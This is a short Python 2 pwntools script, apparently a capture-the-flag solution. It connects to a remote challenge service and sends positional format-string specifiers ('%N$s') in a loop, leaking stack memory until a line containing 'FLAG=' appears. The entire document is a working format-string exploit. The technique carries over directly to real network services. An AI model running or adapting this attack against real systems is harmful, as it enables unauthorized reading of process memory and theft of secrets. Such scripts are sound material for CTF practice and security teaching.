#!/usr/bin/env python2
from pwn import *

pwnlib.args.SILENT(1)

def solve():

    for i in range(1, 100):
        try:
            r = remote('jh2i.com', 50038)
            val = '%' + str(i) + '$s' + '\n'
            r.recvuntil('Your tack:', timeout=3)
            r.sendline(val)
            x = r.recvuntil('Your tack', timeout=3)
            if 'FLAG=' in x:
                print(x)
                r.close()
                break

            print(x)
            r.close()
        except:
            pass
            r.close()


if __name__ == '__main__':
    solve()
